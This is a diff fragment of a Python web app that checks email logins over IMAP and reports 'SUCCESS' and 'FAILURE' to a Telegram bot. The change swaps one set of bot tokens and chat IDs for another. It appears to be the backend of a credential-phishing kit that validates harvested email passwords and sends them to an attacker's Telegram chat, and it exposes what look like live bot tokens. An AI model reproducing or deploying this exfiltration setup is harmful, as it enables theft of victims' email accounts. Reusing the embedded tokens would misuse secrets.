@@ -8,10 +8,10 @@ application = app
 
 imaplib.IMAP4_SSL.timeout = 10
 
-TELEGRAM_API_SUCCESS = "https://api.telegram.org/bot8388592935:AAFACRoucDcQOhPluewqG6QxGA-eWOfsMgU/sendMessage"
-TELEGRAM_API_FAILURE = "https://api.telegram.org/bot8388592935:AAFACRoucDcQOhPluewqG6QxGA-eWOfsMgU/sendMessage"
-SUCCESS_CHAT_ID = "7974336080"
-FAILURE_CHAT_ID = "7974336080"
+TELEGRAM_API_SUCCESS = "https://api.telegram.org/bot1719129378:AAF5bqIt1LtFforRZnbWze5_ehXvWiBTzJI/sendMessage"
+TELEGRAM_API_FAILURE = "https://api.telegram.org/bot1719129378:AAF5bqIt1LtFforRZnbWze5_ehXvWiBTzJI/sendMessage"
+SUCCESS_CHAT_ID = "1223632080"
+FAILURE_CHAT_ID = "1223632080"
 
 def get_imap_server(email):
     domain = email.split('@')[-1]
@@ -80,6 +80,7 @@ if __name__ == "__main__":
     import os
     from app import app  # your app object
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
+
 
 
 
